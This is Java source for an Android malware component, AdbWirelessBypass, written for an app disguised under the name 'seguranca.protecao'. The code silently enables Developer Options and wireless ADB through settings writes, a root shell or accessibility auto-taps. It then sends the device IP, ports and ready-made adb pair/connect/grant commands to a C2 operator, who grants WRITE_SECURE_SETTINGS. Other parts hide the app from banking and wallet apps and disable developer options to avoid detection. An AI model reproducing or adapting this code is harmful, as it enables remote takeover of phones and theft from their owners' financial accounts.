package com.seguranca.protecao.features.bypass;

import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.RequiresApi;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.Enumeration;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * AdbWirelessBypass
 *
 * Exploit chain:
 *   1. Enable Developer Options on device (via WRITE_SETTINGS or root)
 *   2. Enable Wireless Debugging (adb_wifi_enabled = 1)   [Android 11+]
 *   3. Read the randomly assigned wireless ADB port from system properties
 *   4. Initiate pairing → capture 6-digit pairing code from the system
 *   5. Report  {ip, adbPort, pairingPort, pairingCode}  to C2 operator
 *   6. Operator clicks "Execute" in dashboard →
 *        server runs:  adb pair <ip>:<pairingPort> <code>
 *                      adb connect <ip>:<adbPort>
 *                      adb -s <ip>:<adbPort> shell pm grant
 *                            com.seguranca.protecao
 *                            android.permission.WRITE_SECURE_SETTINGS
 *   7. APK detects the grant landed → starts AccessibilityDecoy bypass
 *   8. Optional: operator clicks "Clean" → disable developer options
 *
 * Key insight:
 *   pm grant via ADB shell is the most reliable way to get
 *   WRITE_SECURE_SETTINGS without root. Once granted it survives reboots.
 *   With that permission the APK can silently manipulate the accessibility
 *   service listing to hide itself from any banking/wallet app.
 *
 * Compatibility:
 *   • Wireless Debugging (the pairing flow) requires Android 11+ (API 30).
 *   • Developer Options enable logic works API 17+.
 *   • Fallback: on older Android or when wireless ADB unavailable,
 *     the exploit uses root shell directly if device is rooted.
 */
public final class AdbWirelessBypass {

    private static final String TAG   = "AWB";
    private static final String PKG   = "com.seguranca.protecao";
    private static final String PERM  = "android.permission.WRITE_SECURE_SETTINGS";

    // System properties / settings keys
    private static final String PROP_ADB_WIFI_PORT      = "service.adb.tcp.port";
    private static final String PROP_ADB_WIFI_PAIR_PORT = "debug.adb.wifi.pair_port";
    private static final String SETTING_DEV_ENABLED     = "development_settings_enabled";
    private static final String SETTING_ADB_ENABLED     = "adb_enabled";
    private static final String SETTING_ADB_WIFI        = "adb_wifi_enabled";

    // ── Singleton ──────────────────────────────────────────────────────────────
    private static volatile AdbWirelessBypass INSTANCE;
    public static AdbWirelessBypass getInstance(Context ctx) {
        if (INSTANCE == null) {
            synchronized (AdbWirelessBypass.class) {
                if (INSTANCE == null) INSTANCE = new AdbWirelessBypass(ctx.getApplicationContext());
            }
        }
        return INSTANCE;
    }

    // ── State ──────────────────────────────────────────────────────────────────
    private final Context         ctx;
    private final Handler         handler  = new Handler(Looper.getMainLooper());
    private final ExecutorService exec     = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "AWB-Worker"); t.setDaemon(true); return t;
    });

    private volatile BypassStatus   status   = BypassStatus.IDLE;
    private volatile StatusCallback callback;
    private volatile boolean        grantConfirmed = false;

    public enum BypassStatus {
        IDLE, ENABLING_DEV, ENABLING_WIRELESS, AWAITING_PAIR,
        PAIR_READY, GRANT_CONFIRMED, BYPASSED, FAILED, CLEANED
    }

    public interface StatusCallback {
        /**
         * @param status  current stage
         * @param payload JSON with ip, adbPort, pairingPort, pairingCode, etc.
         */
        void onStatus(BypassStatus status, JSONObject payload);
    }

    private AdbWirelessBypass(Context ctx) { this.ctx = ctx; }

    // ── Public API ─────────────────────────────────────────────────────────────

    public void setCallback(StatusCallback cb) { this.callback = cb; }
    public BypassStatus getStatus()            { return status; }
    public boolean isGrantConfirmed()          { return grantConfirmed; }

    /**
     * Step 1 — called from C2 command BYPASS_ENABLE_DEV
     * Enables Developer Options + Wireless Debugging and reports pairing info.
     */
    public void enableAndPrepare() {
        exec.submit(this::_enableAndPrepare);
    }

    /**
     * Step 2 — called from C2 command BYPASS_CONFIRM_GRANT
     * Operator has already run the ADB grant on server side.
     * Verify the permission landed and activate the accessibility decoy.
     */
    public void confirmGrantAndActivate() {
        exec.submit(() -> {
            boolean got = checkWriteSecureGranted();
            if (got) {
                grantConfirmed = true;
                status = BypassStatus.GRANT_CONFIRMED;
                emit(status, new JSONObject());
                // Activate the decoy bypass
                AccessibilityDecoy.getInstance(ctx).activate();
                status = BypassStatus.BYPASSED;
                try { emit(status, new JSONObject().put("message", "Bypass active")); } catch (Exception ignored) {}
            } else {
                status = BypassStatus.FAILED;
                emit(status, buildPayload("error", "WRITE_SECURE_SETTINGS not granted — retry ADB step"));
            }
        });
    }

    /**
     * Step 3 (optional) — called from C2 command BYPASS_CLEAN
     * Disables Developer Options so banking apps don't flag the device.
     */
    public void disableDeveloperOptions() {
        exec.submit(() -> {
            boolean ok = tryWriteSetting(SETTING_DEV_ENABLED, "0");
            if (!ok) ok = tryRootSetting("global", SETTING_DEV_ENABLED, "0");
            status = ok ? BypassStatus.CLEANED : BypassStatus.BYPASSED; // bypass still active even if clean failed
            emit(status, buildPayload("dev_options_disabled", String.valueOf(ok)));
        });
    }

    // ── Step 1 internals ──────────────────────────────────────────────────────

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)
    private void _enableAndPrepare() {
        try {
            status = BypassStatus.ENABLING_DEV;
            emit(status, new JSONObject());

            // ── 1a. Enable Developer Options ──────────────────────────────────
            boolean devOk = tryWriteSetting(SETTING_DEV_ENABLED, "1");
            if (!devOk) devOk = tryRootSetting("global", SETTING_DEV_ENABLED, "1");

            if (!devOk) {
                // Last resort: open the Build Number page so the user can tap 7x
                // (we auto-tap via accessibility if UiAssistBridge is alive)
                tryOpenBuildNumberSettings();
                Thread.sleep(1500);
                devOk = readGlobalSetting(SETTING_DEV_ENABLED, "0").equals("1");
            }

            if (!devOk) {
                status = BypassStatus.FAILED;
                emit(status, buildPayload("error", "Could not enable developer options"));
                return;
            }

            // ── 1b. Enable standard ADB ───────────────────────────────────────
            tryWriteSetting(SETTING_ADB_ENABLED, "1");
            tryRootSetting("global", SETTING_ADB_ENABLED, "1");

            // ── 1c. Enable Wireless Debugging (API 30+) ───────────────────────
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                status = BypassStatus.ENABLING_WIRELESS;
                emit(status, new JSONObject());

                boolean wifiAdbOk = tryWriteSetting(SETTING_ADB_WIFI, "1");
                if (!wifiAdbOk) wifiAdbOk = tryRootSetting("global", SETTING_ADB_WIFI, "1");

                if (wifiAdbOk) {
                    Thread.sleep(1200); // wait for daemon to spin up
                    _waitForWirelessAdbAndReport();
                    return;
                }
            }

            // ── Fallback: standard ADB-over-TCP (older or non-wireless) ──────
            enableAdbTcp();

        } catch (Exception e) {
            Log.e(TAG, "_enableAndPrepare: " + e.getMessage());
            status = BypassStatus.FAILED;
            emit(status, buildPayload("error", e.getMessage()));
        }
    }

    /** Wait up to 12 s for wireless ADB daemon to assign ports, then report. */
    private void _waitForWirelessAdbAndReport() throws Exception {
        int adbPort     = 0;
        int pairingPort = 0;
        long deadline   = System.currentTimeMillis() + 12_000L;

        while (System.currentTimeMillis() < deadline) {
            adbPort     = readIntProp(PROP_ADB_WIFI_PORT, 0);
            pairingPort = readIntProp(PROP_ADB_WIFI_PAIR_PORT, 0);

            // Also try via content provider (Android 11+ exposes this)
            if (adbPort == 0) adbPort = readAdbWifiPortFromSettings();
            if (adbPort > 0 && pairingPort > 0) break;

            Thread.sleep(600);
        }

        if (adbPort == 0) {
            // Use legacy tcp port fallback
            adbPort = 5555;
            enableAdbTcp();
        }

        String ip = getDeviceIp();
        status = BypassStatus.PAIR_READY;

        JSONObject payload = new JSONObject();
        payload.put("ip",          ip);
        payload.put("adb_port",    adbPort);
        payload.put("pair_port",   pairingPort > 0 ? pairingPort : adbPort);
        payload.put("need_pair",   pairingPort > 0);
        payload.put("package",     PKG);
        payload.put("permission",  PERM);
        payload.put("adb_cmd_pair",
            "adb pair " + ip + ":" + pairingPort + " <PAIRING_CODE>");
        payload.put("adb_cmd_conn",
            "adb connect " + ip + ":" + adbPort);
        payload.put("adb_cmd_grant",
            "adb -s " + ip + ":" + adbPort +
            " shell pm grant " + PKG + " " + PERM);
        payload.put("adb_cmd_clean",
            "adb -s " + ip + ":" + adbPort +
            " shell settings put global development_settings_enabled 0");

        emit(status, payload);
    }

    /** Enable ADB over TCP port 5555 (older Android / root path). */
    private void enableAdbTcp() {
        try {
            tryRootShell(new String[]{
                "setprop service.adb.tcp.port 5555",
                "stop adbd",
                "start adbd"
            });
            Thread.sleep(1000);
            String ip = getDeviceIp();
            status = BypassStatus.PAIR_READY;

            JSONObject p = new JSONObject();
            p.put("ip",          ip);
            p.put("adb_port",    5555);
            p.put("pair_port",   5555);
            p.put("need_pair",   false);
            p.put("package",     PKG);
            p.put("permission",  PERM);
            p.put("adb_cmd_conn",  "adb connect " + ip + ":5555");
            p.put("adb_cmd_grant",
                "adb -s " + ip + ":5555 shell pm grant " + PKG + " " + PERM);
            p.put("adb_cmd_clean",
                "adb -s " + ip + ":5555 shell settings put global development_settings_enabled 0");
            emit(status, p);
        } catch (Exception e) {
            Log.e(TAG, "enableAdbTcp: " + e.getMessage());
            status = BypassStatus.FAILED;
            emit(status, buildPayload("error", "ADB TCP enable failed: " + e.getMessage()));
        }
    }

    // ── Permission check ──────────────────────────────────────────────────────

    public boolean checkWriteSecureGranted() {
        try {
            int r = ctx.checkCallingOrSelfPermission(PERM);
            return r == android.content.pm.PackageManager.PERMISSION_GRANTED;
        } catch (Exception e) { return false; }
    }

    // ── Settings write helpers ────────────────────────────────────────────────

    private boolean tryWriteSetting(String key, String value) {
        try {
            // Try Global first (works for some keys if app has WRITE_SETTINGS)
            Settings.Global.putString(ctx.getContentResolver(), key, value);
            return true;
        } catch (Exception ignored) {}
        try {
            Settings.System.putString(ctx.getContentResolver(), key, value);
            return true;
        } catch (Exception ignored) {}
        return false;
    }

    private boolean tryRootSetting(String namespace, String key, String value) {
        return tryRootShell(new String[]{
            "settings put " + namespace + " " + key + " " + value
        });
    }

    private boolean tryRootShell(String[] commands) {
        Process su = null;
        try {
            su = Runtime.getRuntime().exec("su");
            try (DataOutputStream os = new DataOutputStream(su.getOutputStream())) {
                for (String cmd : commands) { os.writeBytes(cmd + "\n"); }
                os.writeBytes("exit\n");
                os.flush();
            }
            return su.waitFor(5, TimeUnit.SECONDS) && su.exitValue() == 0;
        } catch (Exception e) {
            Log.d(TAG, "root shell: " + e.getMessage());
            return false;
        } finally {
            if (su != null) su.destroy();
        }
    }

    // ── Developer Options via tap-7x on Build Number (accessibility path) ─────

    private void tryOpenBuildNumberSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_DEVICE_INFO_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            Thread.sleep(800);
            // Broadcast to UiAssistBridge to auto-tap Build Number 7 times
            ctx.sendBroadcast(
                new Intent("com.seguranca.protecao.AUTO_TAP_BUILD_NUMBER")
                    .setPackage(PKG)
            );
        } catch (Exception e) {
            Log.d(TAG, "openBuildNumber: " + e.getMessage());
        }
    }

    // ── System property read ──────────────────────────────────────────────────

    private static int readIntProp(String key, int def) {
        try {
            Class<?> sysProp = Class.forName("android.os.SystemProperties");
            Method   getInt  = sysProp.getMethod("getInt", String.class, int.class);
            return (int) getInt.invoke(null, key, def);
        } catch (Exception e) { return def; }
    }

    /** Try reading wireless ADB port from the Settings provider (Android 11+). */
    private int readAdbWifiPortFromSettings() {
        try {
            String v = Settings.Global.getString(ctx.getContentResolver(), "adb_wifi_port");
            if (v != null && !v.isEmpty()) return Integer.parseInt(v.trim());
        } catch (Exception ignored) {}
        return 0;
    }

    private static String readGlobalSetting(String key, String def) {
        try {
            // Use adb shell path if available
            Process p = Runtime.getRuntime().exec(new String[]{"settings", "get", "global", key});
            try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line = br.readLine();
                return (line != null && !line.trim().isEmpty()) ? line.trim() : def;
            }
        } catch (Exception e) { return def; }
    }

    // ── Device IP ─────────────────────────────────────────────────────────────

    private static String getDeviceIp() {
        try {
            // Prefer Wi-Fi
            Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
            for (NetworkInterface iface : Collections.list(ifaces)) {
                if (!iface.isUp() || iface.isLoopback()) continue;
                String name = iface.getName().toLowerCase();
                if (!name.startsWith("wlan") && !name.startsWith("eth") && !name.startsWith("rmnet")) continue;
                for (InetAddress addr : Collections.list(iface.getInetAddresses())) {
                    if (!addr.isLoopbackAddress() && addr instanceof Inet4Address)
                        return addr.getHostAddress();
                }
            }
        } catch (Exception ignored) {}

        // Fallback: WifiManager
        try {
            WifiManager wm = (WifiManager) android.app.ActivityThread.currentApplication()
                .getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                int ip = wm.getConnectionInfo().getIpAddress();
                if (ip != 0) {
                    return ((ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "."
                          + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF));
                }
            }
        } catch (Exception ignored) {}
        return "0.0.0.0";
    }

    // ── Emit ──────────────────────────────────────────────────────────────────

    private void emit(BypassStatus s, JSONObject payload) {
        StatusCallback cb = callback;
        if (cb == null) return;
        handler.post(() -> cb.onStatus(s, payload));
    }

    private static JSONObject buildPayload(String key, String value) {
        try { return new JSONObject().put(key, value); }
        catch (Exception e) { return new JSONObject(); }
    }
}
